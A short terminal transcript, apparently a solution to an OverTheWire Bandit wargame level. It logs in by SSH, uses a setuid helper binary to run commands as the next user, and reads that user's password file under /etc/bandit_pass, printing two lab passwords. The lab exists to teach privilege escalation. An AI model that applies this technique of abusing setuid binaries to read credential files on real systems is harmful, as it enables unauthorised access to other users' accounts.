ssh bandit19@bandit.labs.overthewire.org

IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

bandit19@melinda:~$ ls

bandit20-do

bandit19@melinda:~$ ./bandit20-do

Run a command as another user.
  Example: ./bandit20-do id

bandit19@melinda:~$ ./bandit20-do id

uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11020(bandit20),11019(bandit19)

bandit19@melinda:~$ ./bandit20-do whoami

bandit20

bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/
bandit20

GbKksEFF4yrVs6il55v6gwY5aVje5f0j

bandit19@melinda:~$ exit

logout
